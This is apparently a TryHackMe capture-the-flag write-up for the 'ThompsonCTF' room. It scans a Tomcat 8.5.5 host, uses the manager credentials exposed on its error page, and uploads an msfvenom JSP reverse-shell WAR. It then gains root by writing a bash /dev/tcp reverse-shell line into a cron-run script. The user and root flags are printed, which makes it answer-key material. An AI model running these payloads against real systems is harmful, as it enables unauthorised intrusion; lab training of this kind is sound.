# TryHackMe-ThompsonCTF

>Abdullah Rizwan | 20th September , 03:45 PM

## NMAP
```
Nmap scan report for 10.10.114.149
Host is up (0.17s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.90 seconds

```

## Gobuster

```
gobuster dir -u http://10.10.114.149:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.t
xt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.114.149:8080/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/20 06:49:48 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)

```

Visiting `/manager` wait for timeout and it will show a html page where user name `tomcat` and password `s3ecret` is shown.

Start a netcat listener `nc -lvp [port]`

After that upload a WAR file so look for a payload to upload.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
```
And you will have a reverse shell.


user flag : 39400c90bc683a41a8935e4719f181bf

## Privlege Escalation

There is a script `id.sh` which appends root id to `test.txt` this means `id.sh` is owned by root so we can insert a bash payload to get a reverse shell

`bash -i >& /dev/tcp/10.8.94.60/6969 0>&1`

root flag : `d89d5391984c0450a95497153ae7ca3a`